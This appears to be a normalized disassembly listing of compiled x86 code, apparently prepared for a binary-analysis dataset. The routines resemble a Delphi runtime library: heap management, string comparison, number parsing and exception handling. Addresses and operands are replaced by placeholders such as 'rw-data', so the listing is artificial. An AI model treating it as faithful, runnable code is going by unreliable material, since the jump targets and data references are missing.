mov eax ebx
call sub_402014
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401380
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039a4
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039a4
jmp r-xdata
sub_402298
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40242a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401378
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401380
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_4039a4
jmp r-xdata
call sub_401eb0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bc0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e28
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bc0
sub_40243c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401eb0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bc0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fb4
test al al
je r-xdata
call sub_401bc0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c84
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e28
jmp r-xdata
sub_402618
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026c9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40243c
test al al
je r-xdata
push rw-data
call sub_401378
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402108
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028d8
mov eax ebx
call sub_402298
retn
push rw-data
call sub_401380
sub_4026dc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402838
sub_4026fc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402838
sub_40271c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402838
mov [ ecx ] eax
mov al 0x2
jmp sub_402838
retn
mov [ ecx ] eax
retn
sub_4027ac
push ebx
push esi
call sub_406000
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406000
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406000
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027ec
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406000
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027e0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402874
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028d8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402948
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402988
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402864
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_4029dc
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402864
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402864
jmp r-xdata
sub_402a34
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402a70
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_402a8c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402b10
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b80
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402ba0
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c80
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402cc0
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d73 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d73 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d73
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402fac
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402fdc
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012d4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_40304d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
retn
sub_4030d0
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403178
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4031d0
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_40497c
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4031f0
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4058e8
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403220
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4032a4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4032b4
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4032ab
lea eax [ ebp - 0x8 ]
call sub_4058d0
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4031f0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4058e8
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4032b4
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4032f8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403398
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403338
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403368
push eax
push ecx
mov eax [ eax ]
call sub_403338
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403eb0
call [ rw-data ]
sub_403380
push esi
mov esi edx
mov eax [ eax ]
call sub_403338
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403eb0
call [ rw-data ]
sub_4033c8
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403338
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4033f0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403440
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403490
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4034b9
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403524
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403560
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403574
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403588
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4035a8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403588
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_40360c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4030a0
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406000
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403574
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403524
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403738
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4030a0
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403524
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
